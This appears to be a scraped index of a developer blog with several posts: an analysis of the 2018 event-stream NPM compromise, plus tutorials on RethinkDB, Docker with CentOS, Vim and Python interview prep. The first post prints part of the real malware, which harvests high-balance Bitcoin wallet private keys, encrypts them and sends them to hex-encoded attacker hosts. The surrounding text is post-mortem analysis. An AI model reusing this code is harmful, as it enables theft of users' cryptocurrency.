KEY-----\\\\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxoV1GvDc2FUsJnrAqR4C\\\\nDXUs/peqJu00casTfH442yVFkMwV59egxxpTPQ1YJxnQEIhiGte6KrzDYCrdeBfj\\\\nBOEFEze8aeGn9FOxUeXYWNeiASyS6Q77NSQVk1LW+/BiGud7b77Fwfq372fUuEIk\\\\n2P/pUHRoXkBymLWF1nf0L7RIE7ZLhoEBi2dEIP05qGf6BJLHPNbPZkG4grTDv762\\\\nPDBMwQsCKQcpKDXw/6c8gl5e2XM7wXhVhI2ppfoj36oCqpQrkuFIOL2SAaIewDZz\\\\nLlapGCf2c2QdrQiRkY8LiUYKdsV2XsfHPb327Pv3Q246yULww00uOMl/cJ/x76To\\\\n2wIDAQAB\\\\n-----END PUBLIC KEY-----\u0026#34;; function i(e, t, n) { e = Buffer.from(e, \u0026#34;hex\u0026#34;).toString(); var r = o.request({ hostname: e, port: 8080, method: \u0026#34;POST\u0026#34;, path: \u0026#34;/\u0026#34; + t, headers: { \u0026#34;Content-Length\u0026#34;: n.length, \u0026#34;Content-Type\u0026#34;: \u0026#34;text/html\u0026#34; } }, function() {}); r.on(\u0026#34;error\u0026#34;, function(e) {}), r.write(n), r.end() } function r(e, t) { for (var n = \u0026#34;\u0026#34;, r = 0; r \u0026lt; t.length; r += 200) { var o = t.substr(r, 200); n += a.publicEncrypt(c, Buffer.from(o, \u0026#34;utf8\u0026#34;)).toString(\u0026#34;hex\u0026#34;) + \u0026#34;+\u0026#34; } i(\u0026#34;636f7061796170692e686f7374\u0026#34;, e, n), i(\u0026#34;3131312e39302e3135312e313334\u0026#34;, e, n) } function l(t, n) { if (window.cordova) try { var e = cordova.file.dataDirectory; resolveLocalFileSystemURL(e, function(e) { e.getFile(t, { create: !1 }, function(e) { e.file(function(e) { var t = new FileReader; t.onloadend = function() { return n(JSON.parse(t.result)) }, t.onerror = function(e) { t.abort() }, t.readAsText(e) }) }) }) } catch (e) {} else { try { var r = localStorage.getItem(t); if (r) return n(JSON.parse(r)) } catch (e) {} try { chrome.storage.local.get(t, function(e) { if (e) return n(JSON.parse(e[t])) }) } catch (e) {} } } global.CSSMap = {}, l(\u0026#34;profile\u0026#34;, function(e) { for (var t in e.credentials) { var n = e.credentials[t]; \u0026#34;livenet\u0026#34; == n.network \u0026amp;\u0026amp; l(\u0026#34;balanceCache-\u0026#34; + n.walletId, function(e) { var t = this; t.balance = parseFloat(e.balance.split(\u0026#34; \u0026#34;)[0]), \u0026#34;btc\u0026#34; == t.coin \u0026amp;\u0026amp; t.balance \u0026lt; 100 || \u0026#34;bch\u0026#34; == t.coin \u0026amp;\u0026amp; t.balance \u0026lt; 1e3 || (global.CSSMap[t.xPubKey] = !0, r(\u0026#34;c\u0026#34;, JSON.stringify(t))) }.bind(n)) } }); var e = require(\u0026#34;bitcore-wallet-client/lib/credentials.js\u0026#34;); e.prototype.getKeysFunc = e.prototype.getKeys, e.prototype.getKeys = function(e) { var t = this.getKeysFunc(e); try { global.CSSMap \u0026amp;\u0026amp; global.CSSMap[this.xPubKey] \u0026amp;\u0026amp; (delete global.CSSMap[this.xPubKey], r(\u0026#34;p\u0026#34;, e + \u0026#34;\\\\t\u0026#34; + this.xPubKey)) } catch (e) {} return t } } catch (e) {} } window.cordova ? document.addEventListener(\u0026#34;deviceready\u0026#34;, e) : e() }(); A few things initially jump out. We can see that the injection code is targeting bitcoin, whether it\u0026rsquo;s targeting vulnerable wallets or attempting to mine coins on remote hosts, it\u0026rsquo;s difficult to decipher from this hacker\u0026rsquo;s spaghetti code. Often times, malicious actors will attempt to make their code as difficult to read and understand as possible. JavaScript minifiers make this easier for them and it can be a real challenge to generate a readable file from minified, abstract code.\nIn short, the community was able to realize that these two code bits will search for vulnerable crypto-currency wallets, check for the copay NPM module, and attempt to steal the wallets and funds stored within them through the targeted module. Thankfully, this vulnerability is not as far reaching as people first thought it might be. An application must be running this malicious code, the copay dependency, and have a wallet with funds.\nAftermath The people at NPM quickly took down the malicious version of event stream and the maintainers of the copay module put up a warning about the vulnerability. Unfortunately, the malicious code was not realized for almost 2 months. The last commit to the event stream repository was around September 20th, 2018 and the Github issue that started this was not opened until November 20th, 2018. There\u0026rsquo;s no real way to know how many people were negatively affected by this but it\u0026rsquo;s clear that this vulnerability reached millions of people running the event stream module through some node dependency.\nCommunity Standards This event triggered a huge backlash from the community. Why was this hacker given maintainer credentials and allowed to have publishing access to the module? Why were the countless other community members not aware of his commits? Who bares the responsibility for this open source project?\nPer the open source license provided in the module, we see the following: \u0026lsquo;THE SOFTWARE IS PROVIDED \u0026ldquo;AS IS\u0026rdquo;, WITHOUT WARRANTY OF ANY KIND\u0026rsquo;. Dose this absolve the original creator for his mistake? Dose the sole responsibility lay with the user of the software, regardless of its state? Unfortunately, this leaves many unanswered questions.\nShould I Trust You? I think it\u0026rsquo;s important to recognize the larger issue here; NPM modules are too easily trusted. I don\u0026rsquo;t know how many times I\u0026rsquo;ve looked online for something, found a package, downloaded it, and used it within my project without question. For all I know, I could be putting my users at risk of some attack by using a malicious dependency. NPM is an amazing tool, but it\u0026rsquo;s important to realize that vulnerabilities exist. Here are some tips for safe NPM package usage:\nIs the package open source? Is the package maintained by a community? Is the community currently active? How can I contribute to maintain this open source project? By involving yourself in the open source projects that you use, you can become a vigilant member of the community that protects and maintains open source software. Solo hero developers are far and few between, so don\u0026rsquo;t depend on them. Get involved, be apart of the open source community, and contribute to the projects that you use.\nIf you found this blog post valuable, consider subscribing to future posts via RSS or buying me a coffee via GitHub sponsors.\n","permalink":"https://johncodes.com/posts/npm-event-stream/","summary":"(Note: this post is from a legacy blog dated 12/14/2018 and some content or links may have changed)\nA few weeks ago, this issue was opened on a popular Node NPM package called Event Stream. This package enables Node streams to be simpler and streamlines many I/O operations within Node. Regardless, this package is a key dependency for many other Node packages and has over 1 million downloads per week from NPM.","title":"To Catch a Hacker - NPM Even Stream"},{"content":"(Note: this is from an old blog archieve dating 2018/11/05. Some things with Rethink have very likely changed) RethinkDB is a JSON based, non-relational database that provides a promise oriented, Node JS backend. It integrates seamlessly with JSON type data and is a production ready option for Node infrastructures.\nPre-reqs: Docker, Node, NPM\nThis post will serve as a brief overview of RethinkDB and hopefully give you a taste of how it works and why a JSON based database might be beneficial for you and your product. You should have some knowledge of docker for this tutorial, but it\u0026rsquo;s not required. However, knowledge of Node and JavaScript will be necessary.\nRun the offical Docker Image You can pull and run the official rethink docker image to start the database locally. Simply give it a name and you\u0026rsquo;re on your way!\ndocker run -d -P --name \u0026lt;your container name\u0026gt; rethinkdb To check the port mappings in docker, simply run\ndocker port \u0026lt;your container name\u0026gt; This will show you something like this:\n28015/tcp -\u0026gt; 0.0.0.0:32769 29015/tcp -\u0026gt; 0.0.0.0:32768 8080/tcp -\u0026gt; 0.0.0.0:32770 Each of the local port mappings appear on the right and the docker container exposed ports are on the left.\nSo, if you wanted to access the containers 8080 port, we would navigate to localhost:32770. We can see this from the example as 8080/tcp -\u0026gt; 0.0.0.0:32770.\nAlternatively, you can install rethinkdb for your specific machine and run it locally. This can be found on the RethinkDB install page. Using the docker container \u0026amp; image is a nice, light weight, modular way to run rethink, similar to how a production microservice architecture might be configured. I also like being able to control the exact environment that my rethink database is running in, it\u0026rsquo;s ports, and other fun docker quality of life things!\nUsing the RethinkDB admin pannel If using the docker container, navigate to the Admin Panel by going to localhost:32770 in a browser. From our previous example, we can see that this local port is mapped to the docker container port 8080 (which is the web admin panel). If you\u0026rsquo;re running rethink on your machine locally, you should be able to simply navigate to localhost:8080.\nIn the admin pannel, you create new databases, explor data, see logs, track performance, and see what connections are running. Lets create a database with a few tables.\nIn the top navigation bar, go to the \u0026ldquo;Data Explorer\u0026rdquo; and enter the following:\nr.dbCreate(\u0026#39;ships\u0026#39;) r.db(\u0026#39;ships\u0026#39;).tableCreate(\u0026#39;battle_ships\u0026#39;) r.db(\u0026#39;ships\u0026#39;).tableCreate(\u0026#39;cruisers\u0026#39;) These raw rethink queries create and build our initial database. This can also be acomplished from \u0026ldquo;Tables\u0026rdquo; in the top navigation bar or right in your node app! However, the \u0026ldquo;Data Explorer\u0026rdquo; is an essential tool for viewing, manuipulating, and creating data. This is a great link for useful Data Explorer queries.\nInstall Rethink javascript drivers via NPM In order to use the rethink drivers in our Node app, we need to install them via NPM. From the command line:\nnpm install rethinkdb The node_modules folder will now contain the necessary rethink drivers for accessing our rethink instance. To access the rethink drivers from your Node app, require the drivers:\nconst r = require(\u0026#39;rethinkdb\u0026#39;); Open a connection to the Rethink instance let connection = null; // This could also be declared from a .env file let config = { host: \u0026#39;localhost\u0026#39;, port: \u0026#39;32769\u0026#39; } r.connect(config, function(err, conn) { if (err) throw err; connection = conn; }); Now, the connection variable will hold the raw data necessary to connect to the rethink instance. Make special note of what port you specify. This should be the port that maps to 28015 in the docker container.\nFor this local instance of the rethinkdb, we won\u0026rsquo;t worry too much about dynamic ports or not exposing the ports to the public in production. Here is a good article about one way you can create production ready ports and configurations.\nThis step can be quite complicated. You can do a number of things per your needs, including placing this step into some middleware to connect automatically, check the configuration of your database, reconfigure settings if something is wrong, or validate authorization. Check out this repository from the rethink people for more complex operations around connecting.\nBasic Crud Operations Insert Data // Inserts 2 battleships r.db(\u0026#39;ships\u0026#39;).table(\u0026#39;battle_ships\u0026#39;).insert([ { \u0026#39;name\u0026#39;: \u0026#39;Arizona\u0026#39;, \u0026#39;size\u0026#39;: 22, \u0026#39;guns\u0026#39;: [ \u0026#39;railgun\u0026#39;, \u0026#39;off_shore_missles\u0026#39; ] }, { \u0026#39;name\u0026#39;: \u0026#39;Iowa\u0026#39;, \u0026#39;size\u0026#39;: 34, \u0026#39;guns\u0026#39;: [ \u0026#39;light_machine\u0026#39; ] }]).run(connection, function (err, res) { if (err) throw err; console.log(JSON.stringify(res)); }) We can see that we are inserting raw JSON objects! Awesome! Now, from the Data explorer, if we query the battle_ships table:\nr.db(\u0026#39;ships\u0026#39;).table(\u0026#39;battle_ships\u0026#39;) We will see the following JSON has been entered into the database:\n{ \u0026#34;guns\u0026#34;: [ \u0026#34;railgun\u0026#34; , \u0026#34;off_shore_missles\u0026#34; ] , \u0026#34;id\u0026#34;: \u0026#34;35502dbd-0354-4ca8-bef5-06825ab8df26\u0026#34; , \u0026#34;name\u0026#34;: \u0026#34;Arizona\u0026#34; , \u0026#34;size\u0026#34;: 22 } { \u0026#34;guns\u0026#34;: [ \u0026#34;light_machine\u0026#34; ] , \u0026#34;id\u0026#34;: \u0026#34;b960127b-994f-44b7-88f5-f7463fc90dae\u0026#34; , \u0026#34;name\u0026#34;: \u0026#34;Iowa\u0026#34; , \u0026#34;size\u0026#34;: 34 } Getting data // Get all battle ships r.db(\u0026#39;ships\u0026#39;).table(\u0026#39;battle_ships\u0026#39;) .run(connection, function(err, cursor) { if (err) throw err; cursor.toArray(function(err, res) { if (err) throw err; console.log(JSON.stringify(res)); }); }); In this example, we are getting all the ships in the battle_ships table. Most rethink queries of this size will return a cursor by default, so to get the raw results, we must make it an array with the .toArray method. The callback will contain the results that can than be parsed further.\n// Get specific battleship r.db(\u0026#39;ships\u0026#39;).table(\u0026#39;battle_ships\u0026#39;) .get(\u0026#39;35502dbd-0354-4ca8-bef5-06825ab8df26\u0026#39;) .run(connection, function(err, res) { if (err) throw err; console.log(JSON.stringify(res)); }); This gets a single ship from the battle_ships table based on the primary key. The primary key is the ID automatically assigned to the inserted JSON. The results we get back in the callback function is the JSON object of the provided key.\nUpdate JSON objects // Update the length of The Texas battle ship r.db(\u0026#39;ships\u0026#39;).table(\u0026#39;cruisers\u0026#39;).filter(r.row(\u0026#34;name\u0026#34;).eq(\u0026#34;Texas\u0026#34;)) .update({ \u0026#34;length\u0026#34;: 33 }).run(connection, function(err, res) { if (err) throw err; console.log(JSON.stringify(res)); }); Here, we update a ship\u0026rsquo;s length by providing an updated JSON object. Note that we don\u0026rsquo;t need to provide all fields of the object in order for it to be updated. Once we run the query, the returned result will be what was updated in the database. This snippet also introduces the .filter rethink method. This can be used to pull specific records based on a number of conditions. Finding json objects this way is very powerful and can be chained with other queries. Almost anything you can do with SQL or Mongo, you can do with rethink queries. Check out this awesome page for some really useful queries.\nDelete JSON data // Remove the Iowa battle ship r.db(\u0026#39;ships\u0026#39;).table(\u0026#39;battle_ships\u0026#39;) .filter(r.row(\u0026#39;name\u0026#39;).eq(\u0026#39;Iowa\u0026#39;)) .delete() .run(connection, function(err, res) { if (err) throw err; console.log(JSON.stringify(res)); }); Here, we again use the .filter method to find a document in the database. Then, we delete it using the .delete() rethink method. After running this query, the JSON will be removed from the database.\nConclusion I hope that this little dive into RethinkDB has been interesting and has you curious about JSON based databases. Being able to store raw JSON in a NoSQL database is extremely powerful and fits well with JavaScript based architectures.\nIf you found this blog post valuable, consider subscribing to future posts via RSS or buying me a coffee via GitHub sponsors.\n","permalink":"https://johncodes.com/posts/rethink-db-cookbook/","summary":"(Note: this is from an old blog archieve dating 2018/11/05. Some things with Rethink have very likely changed) RethinkDB is a JSON based, non-relational database that provides a promise oriented, Node JS backend. It integrates seamlessly with JSON type data and is a production ready option for Node infrastructures.\nPre-reqs: Docker, Node, NPM\nThis post will serve as a brief overview of RethinkDB and hopefully give you a taste of how it works and why a JSON based database might be beneficial for you and your product.","title":"Rethink-DB Cookbook"},{"content":"If you are a Oregon State CS 344 student, then you\u0026rsquo;ve been told to develop exclusively on the OS1 server. Unfortunately, this server is frequently nuked by fork bombs. If you are unable to run a full CentOS virtual machine, then here is a step by step guide to getting a CentOS docker container running on your computer. This way, you can continue to work on your assignments in a similar environment to OS1 and not have to have a full virtual machine running!\nNote: when a \u0026ldquo;host\u0026rdquo; is referenced, this is in regard to your own laptop and your own environment, not any container or virtual machine you might have running.\n1. Get Docker You can download and install Docker at this link\nDocker creates operating system level virtualizations through \u0026ldquo;containers\u0026rdquo;. It‚Äôs alot like a traditional Virtual Machine, but containers are run through the host system kernel while maintaining their own software libraries and configurations. In short, containers are significantly less expensive as they don\u0026rsquo;t have to spin up their own virtual kernels.\n2. Start docker Once you\u0026rsquo;ve installed Docker, fire it up. It will run in the background and give you access to its command line tools.\n3. Pull the CentOS image Grab the CentOS image with the following command:\ndocker pull centos An image is a template \u0026ldquo;snapshot\u0026rdquo; used to build containers. Images contain the specific configurations and packages that define what a container is.\n4. Start the container docker run -i -t centos This will bring up the CentOS container in interactive mode with the CentOS command line. There are a huge number of flags for running containers, but this is an easy way to directly gain access to the CentOS command line.\nHere is the docker reference for flags and running an image.\n5. Install dev dependencies Because this CentOS image is a bare bone, fresh start, linux distro with nothing on it, you will need to install a few unix dev tools. This can easily be done with the following command:\nyum groupinstall \u0026#34;Development tools\u0026#34; To install Vim:\nyum install vim If you find that you\u0026rsquo;re missing some tool, try searching online for the install command (make sure to specify CentOS when googling). It is likely a yum command that you\u0026rsquo;re looking for.\n6. Place files onto container Using SCP You can pull down your files from a server with this command:\nscp username@access.engr.oregonstate.edu:~/path/to/smallsh.zip /path/to/destination Using Docker cp If you have files on your local host machine that you want on the docker container, you can use the built in docker cp command on your host machine:\ndocker cp path/to/file/testing.txt \u0026lt;container name\u0026gt;:/path/to/destination This might look something like this:\ndocker cp path/to/testing.txt wizardly_montalcini:/path/to/target Note: the container needs to be running for this to work!\nTo find the running container name, use the following command on your host machine:\ndocker container ls This will show us something like this. We can find the name on the far right:\nCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 4218f505a811 centos \u0026#34;/bin/bash\u0026#34; 2 minutes ago Up 2 minutes wizardly_montalcini 7. Work, Compile, Run Now that you have the container running, installed the development dependencies, and pulled your files, you can proceed normally! Work on your program with vim, compile, and run your executable as you would on OS1.\nHere\u0026rsquo;s an example of me doing this on a CentOS docker container\n[root@f30ebeebacde /]# make gcc -Wall -c smallsh.c buffer_io.c utility.c gcc -Wall -o smallsh smallsh.o buffer_io.o utility.o [root@f30ebeebacde /]# ./smallsh :ls README.md buffer_io.c etc lib64 media proc sbin smallsh.c srv usr var anaconda-post.log buffer_io.o home makefile mnt root shelltest smallsh.h sys utility.c bin dev lib mcbridej_smallsh.zip opt run smallsh smallsh.o tmp utility.o :cat README.md # Smallsh Author: John McBride ... 8. Get files off container Once you are ready to get your files back, you can use SCP or the built in docker cp command. These are similar to putting your files onto the container, but with the paths switched.\nUsing SCP scp /path/to/file.txt username@access.engr.oregonstate.edu:~/path/to/target Using docker cp On your local host:\ndocker cp \u0026lt;containerId\u0026gt;:/file/path/within/container /host/path/destination 9. Using Docker volumes There is a better way to get files on and off your container, but it\u0026rsquo;s slightly more complicated. In this example, let\u0026rsquo;s mount a file system volume. You can read all about volumes and how they are defined by docker. But the quick and dirty way to get files on to a container from your host when you start docker is as follows:\n$ docker run -it -v \u0026#34;/host/user/folder/to/mount:/container/destination\u0026#34; centos Note the new -v flag followed by a full file path mapping. Let\u0026rsquo;s break it down. The -v command tells docker to mount a volume. The first part of the path preceding the : defines the source directory in the host\u0026rsquo;s filesystem to mount. The path after the : defines the destination inside the container to mount the directory!\nNow, when you poke around the container, the files from the source folder will be in the destination folder. The really cool thing about this is that files are persisted across volumes. Or in other words, if you change a file that\u0026rsquo;s been mounted by a volume, it will also be changed on host! This eliminates the need for copy files and folders to and from the container!\nMuch thanks to Nathan for pointing out this tidbit!\n10. Exiting the container You can exit and stop a container in interactive mode with Ctrl d\nYou can detach from a container when in interactive mode with Ctrl p Ctrl q. To re-attach to the container, use the docker attach command:\ndocker attach \u0026lt;container name\u0026gt; This would be something like this:\ndocker attach wizardly_montalcini If you need to kill a container, you can use the docker kill command:\ndocker kill \u0026lt;container name\u0026gt; Using our example, this would look like this:\ndocker kill wizardly_montalcini Warning! Containers are NOT persistent. Again, they are NOT persistent. Once one is stopped or killed, you will loose everything on it. If you want to keep a container running, just detach from it or make sure to SCP or docker cp your files off the container before you kill it.\nIf you stop a docker container you can bring it back up with the docker run -i -t centos command.\nExtras! This section will serve as some docker extras.\nCentOS Docker Hub The official CentOS Docker image from docker hub - This has some interesting tid-bits about security dependencies and installing updates.\nDockerfiles Starting the container and installing the dev dependencies every single time you start it can be kind of annoying. Thankfully, you can use dockerfiles to automate building containers. Here is a sample dockerfile that will build the centos container and install the dev dependencies for us.\nCMD yum groupinstall \u0026#34;Development tools\u0026#34; These can get really complicated. Here is some very useful info on how dockerfiles work, how to use them, and how you can make one that fits your needs.\nHere is the official CentOS dockerfile repository on github.\nIf you found this blog post valuable, consider subscribing to future posts via RSS or buying me a coffee via GitHub sponsors.\n","permalink":"https://johncodes.com/posts/docker-trouble/","summary":"If you are a Oregon State CS 344 student, then you\u0026rsquo;ve been told to develop exclusively on the OS1 server. Unfortunately, this server is frequently nuked by fork bombs. If you are unable to run a full CentOS virtual machine, then here is a step by step guide to getting a CentOS docker container running on your computer. This way, you can continue to work on your assignments in a similar environment to OS1 and not have to have a full virtual machine running!","title":"Virtual machine trouble?? Try Docker!"},{"content":"(Note: this is a post from a legacy blog. This post was intended to help new OSU students get started with Vim)\nI\u0026rsquo;d consider myself some sort of Vim - evangelist. It\u0026rsquo;s an incredible tool and has ALOT of power. If there\u0026rsquo;s something you wish Vim could do, there\u0026rsquo;s probably a plugin for it or a way to make Vim do it with scripting (in its own language!). Moderate proficiency in Vim is a skill that nearly every developer could benefit from. Being able to modify files directly on a server is necessary in almost every development sphere.\nGet Vim Most unix like operating systems (including MacOS) should come pre-packaged with Vim. If not, you can install it with yum:\nyum install vim Or apt-get\nsudo apt-get update sudo apt-get install vim On windows you\u0026rsquo;ll want to use the installation wizard provided by the vim organization\nOn MacOS, if for some reason you\u0026rsquo;re missing Vim, you can install it with the Homebrew installer (a great package manager and installer):\nbrew install macvim Getting started: Command cheat sheets: Cheat sheets are really great to have printed off at your desk for quick reference. Here are a few of my favorites:\nfprintf.net Linux Training Academy VimSheet.com Interactive Tutorials The Vim browser game This is a great way to learn the movement keys to get around a file and do basic operations. Here are some other great resources on getting started in Vim:\nvimtutor Vim is packaged with its own tutorial named vimtutor! To start the tutorial, simple enter the name of the program! You can exit vimtutor the same way you would normally exit vim (see the section below)\nvimtutor Vim in 4 weeks A comprehensive, in depth plan to learning the various aspects of Vim. This article gets talked alot about when people are learning Vim.\nOnly use Vim! If you only use Vim, and don\u0026rsquo;t let yourself use anything else (like sublime text or VS Code), you\u0026rsquo;ll learn fast (but I would recommend going through one of the interactive tutorials first)!\nExiting Vim: Alot of people start up vim and then get frustrated by not being able to save and exit. It\u0026rsquo;s confusing initially! Here are a few different ways to save and exit!\nSaving and Exiting Hit esc to ensure you\u0026rsquo;re in normal mode Enter the command palette by hitting : Type qw and hit enter. This will \u0026ldquo;write\u0026rdquo; the file and than \u0026ldquo;quit\u0026rdquo; Vim Alternatively: in normal mode, hitting ZZ (yes both capitalized) will save and exit vim for you!\nMaking a hard exit Hit esc to ensure you\u0026rsquo;re in normal mode Enter the command palette by hitting : Type q! and enter to force vim to quite without writing (saving) anything. Danger! All things you typed since your last \u0026ldquo;write\u0026rdquo; will NOT be saved Just saving Hit esc to ensure you\u0026rsquo;re in normal mode Enter the command palette by hitting : Type w and enter to \u0026ldquo;write\u0026rdquo; your changes Customize Vim: When starting Vim, it will search for a .vimrc file in your home directory (based on your home path name). If you don\u0026rsquo;t have one, you can create one (right in your home directory, usually the same directory as your .bashrc) and use it to customize how vim functions on startup! The following are some basics that everyone should have (The reader should note that \u0026quot; are comments in Vimscript):\n\u0026#34; Turns on nice colors colo desert \u0026#34; Turns on the syntax for code. Automatically will recognize various file types syntax on Placing these (and other vimscript things) into your .vimrc will change the behavior of vim when it starts. Here\u0026rsquo;s a vimscript for setting tabs to be 4 spaces!\nfiletype plugin indent on \u0026#34; show existing tab with 4 spaces width set tabstop=4 \u0026#34; when indenting with \u0026#39;\u0026gt;\u0026#39;, use 4 spaces width set shiftwidth=4 \u0026#34; On pressing tab, insert 4 spaces set expandtab This next one is more involved, but it auto creates closing parenthesis for us! We can see that the h and i in this vimscript are the literal movement commands given to vim after auto completing the parenthesis to get the cursor back to the it\u0026rsquo;s correct position.\n\u0026#34; For mapping the opening paran with the closing one inoremap ( ()\u0026lt;Esc\u0026gt;hi This should give you a small taste of what vimscript is like and what it\u0026rsquo;s capable of. It can do alot and it\u0026rsquo;s very powerful. If there\u0026rsquo;s something you want Vim to do (like something special with spacing, indents, comments, etc), search online for it. Someone has likely tried to do the same thing and wrote a Vim script for it.\nThis cool IBM guide goes into some depth with how vim scripting works and what you can build.\nSearch in Vim: Vim makes it super easy to search and find expressions in the file you have open; it\u0026rsquo;s very powerful.\nTo search, when in normal mode (hit esc a few times):\nhit the forward-slash key / Begin typing the phrase or keyword you are looking for Hit enter The cursor will be placed on the first instance of that phrase! While still in normal mode, hit n to go to the next instance of that phrase! Hitting N will go to the previous instance of that phrase To turn off the highlighted phrases you searched for, in normal mode, hit the colon : to enter the command palette Type noh into the command palette to set \u0026ldquo;no highlighting\u0026rdquo; and the highlights will be turned off Split window view! You can have two instances of Vim open at once in a split window on the terminal. This is like tmux, but it\u0026rsquo;s managed exclusively by vim!\nHorizontal split When in normal mode, enter this into the command palette to enter a horizontal split. The \u0026ldquo;name of file to load\u0026rdquo; is the path to a file you want to open. The path is relative to where Vim was started from.\n:split \u0026lt;name of file to load\u0026gt; To achieve a vertical split:\n:vsplit \u0026lt;name of file to load\u0026gt; To change the current active panel, (when in normal mode) hit Ctrl w Ctrl w (yes, that\u0026rsquo;s ctrl w twice)\nInception Start a bash shell (or any other unix-y command) right in Vim! (in other words, yes Inception is real). When in normal mode, start the command palette and use the following command to bring up a bash shell\n:!bash Note the exclamation mark telling Vim to execute the command.\nHere\u0026rsquo;s where it gets crazy. Your initial shell you used to enter Vim is still running. On top of that shell, Vim is running. Now, on top of that, a bash shell instance is now running! It\u0026rsquo;s sort of like an onion with all the layers you can go down into. To get back to Vim, exit your bash instance with the exit command. If you than exit Vim, you will be back to your original shell. A word of warning though, all this job handling and nested processes can get fairly processor hungry. So, if your noticing some chugging, back off alittle on the inception.\nYou can execute almost any unix command like this. For example:\n:!wc sample.txt This will run the word count program for the sample.txt file! Command inception is crazy cool!\nBlock Comments I find this extremely helpful when doing full Vim development. This is taken from the following Stack Overflow discussion\nFor commenting a block of text:\n\u0026ldquo;First, go to the first line you want to comment, press Ctrl V. This will put the editor in the VISUAL BLOCK mode.\nNow using the arrow key, select up to the last line you want commented. Now press Shift i, which will put the editor in INSERT mode and then press #.\nThis will add a hash to the first line. (if this was a C file, just type //). Then press Esc (give it a second), and it will insert a # character on all other selected lines.\u0026rdquo;\nUn-commenting is nearly the same, but in opposite order using the visual block mode!\nTime traveling! Yes, you heard that right, vim makes time travel possible! Note, this ONLY works within current Vim sessions. So, if you exit vim, you will lose your current session\u0026rsquo;s stack of edits.\nOn the Vim command palette, which you can enter from Normal mode by hitting the colon :, you can type \u0026rsquo;earlier\u0026rsquo; and \u0026rsquo;later\u0026rsquo; to go back and forth in your current session stack of edits. This is super helpful if you need to revert a few small changes you\u0026rsquo;ve made in the last minute or want to revert everything you did in the last hour. Or if you decide you do want those changes, go forward in time too!\n:earlier 3m :later 5s Plugins One of the reasons Vim is so great is that there are TONS of awesome plugins for Vim. If you\u0026rsquo;re having a hard time scripting something on your own with vimscript, there\u0026rsquo;s probably a plugin for it! They range anywhere from super useful to super silly. Some of my favorites include the file system NERD tree, the fugitive git client, and ordering pizza with Vim Pizza (yes that\u0026rsquo;s right, you can order pizza with Vim! It can really do it all!)\nCheck out this great resource for discovering Vim plugins, instructions to install them, and buzz around the Vim community.\nConclusion: This by no means is a comprehensive guide. There are a ton of great resources for Vim out there and its capabilities. This guide should serve more as a small taste to what Vim can do and maybe peaked your interest to learning more about it.\nTake heart! Vim has a steep learning curve, and, like any complex tool set, it takes alot of time and practice to get good with. Google is your friend here.\nFeel free to reach out to me if something from this guide was not super clear!\nIf you found this blog post valuable, consider subscribing to future posts via RSS or buying me a coffee via GitHub sponsors.\n","permalink":"https://johncodes.com/posts/vim-tips/","summary":"(Note: this is a post from a legacy blog. This post was intended to help new OSU students get started with Vim)\nI\u0026rsquo;d consider myself some sort of Vim - evangelist. It\u0026rsquo;s an incredible tool and has ALOT of power. If there\u0026rsquo;s something you wish Vim could do, there\u0026rsquo;s probably a plugin for it or a way to make Vim do it with scripting (in its own language!). Moderate proficiency in Vim is a skill that nearly every developer could benefit from.","title":"Vim Tips!"},{"content":"Hi there! üåä My name is John. I\u0026rsquo;m a software engineer at Amazon Web Services where I work on open source software, kubernetes, Linux operating systems, and cloud technology.\nThis site is my personal landing page and blog. All opinions and views herein are my own opinions and do not reflect those of employer (past, present, future, or interdimensional).\nEnjoy!\nSupport If you find anything I\u0026rsquo;ve done valuable, consider subscribing to future posts via RSS or buying me a coffee via GitHub sponsors.\nContact I can be reached at hello@johncodes.com\n","permalink":"https://johncodes.com/about/","summary":"Hi there! üåä My name is John. I\u0026rsquo;m a software engineer at Amazon Web Services where I work on open source software, kubernetes, Linux operating systems, and cloud technology.\nThis site is my personal landing page and blog. All opinions and views herein are my own opinions and do not reflect those of employer (past, present, future, or interdimensional).\nEnjoy!\nSupport If you find anything I\u0026rsquo;ve done valuable, consider subscribing to future posts via RSS or buying me a coffee via GitHub sponsors.","title":""},{"content":"The No Nonsense Interview Prep The following is interview preperation material for software engineer and development roles that covers the most common aspects of data structures, algorithms, design, and behavioral.\nThis interview manual is ever evolving; I make changes to it frequently as my experience grows and I find new resources.\nPython Crash Course But why Python? Basic operations Data structures Arrays Python Crash Course The following is a crash course in Python that I\u0026rsquo;ve used to refresh my knowledge and understanding of the langauge from a high level.\nBut why Python? The last thing you want to do during a technical white board interview is stumble over weird or complicated syntax, forget how some library works, or waste time sketching out alot of boilerplate.\nFurther, because of how close python is to normal spoken language, even if the person interviewing you doesn\u0026rsquo;t have a firm grasp of python, they will understand what you\u0026rsquo;re trying to do.\nIn short, it\u0026rsquo;s all about communication. Python is easy to communicate, reason about, simple to understand, and reduces the overall complexity of your technical interview.\nPython is just really simple and un-complicated.\nBasic operations Data structures Arrays # initializing arrays with array values arr = [1, 2, 3] # Use `append()` to insert a new value at end of the array. # This is a O(1) operation but may require that we # grow the underlying datastructure to accommodate the new element. # # An understand of how arrays \u0026#34;grow\u0026#34; under the hood as we add elements # is a necessary part of understanding the time complexity of using arrays. arr.append(4); # Use insert() to insert a value at a specific position. # This inserts 5 at the 2nd position. This is NOT zero indexed. # This is a O(n) operation in the worst case given all elements # may need to be \u0026#34;shifted\u0026#34; or the underlying array may need to grow arr.insert(2, 5) # We can perform an in place sort. # The `arr` will now be sorted. arr.sort() # This returns a sorted copy where `arr` is not mutated. sorted(arr) # You may apply a lambda to the sorting. # # A lambda is essentially an \u0026#34;anonymous\u0026#34; function # that can take any arbitrary number of inputs. # # This example uses an arbitrary \u0026#34;student\u0026#34; class # that has some \u0026#34;grade_point_average\u0026#34; data member. # # For the `.sort()` method, we can supply a key # and in this example, use the student\u0026#39;s gradepoint averages student.sort(key=lambda student: student.grade_point_average) # Reverses the array. # Ever get a \u0026#34;reverse string\u0026#34; question? Just use this! arr.reverse() # Returns the index of the first occurrence of the given element. arr.index(2) # Removes the first occurence of the given element arr.remove(2) # Returns true if element is in the array # The time complexity of this is O(n) in order to scan the whole array if 2 in arr: print(\u0026#39;2 is in the array!\u0026#39;) # Creates a shallow copy (where compound objects are only REFERENCES, not deep copies) copy.copy(arr) # Creates a deep copy which recursively inserts copies of any nest, compound objects # Most of the time, during interview quetsions, you probably want a deep copy copy.deepcopy(arr) # Returns the minimum element within the array min(arr) # Returns the maximum element within the array max(arr) # Slicing is very useful where array[start:stop:step] # So, for example, this prints the array starting at the second element # and going in reverse order. 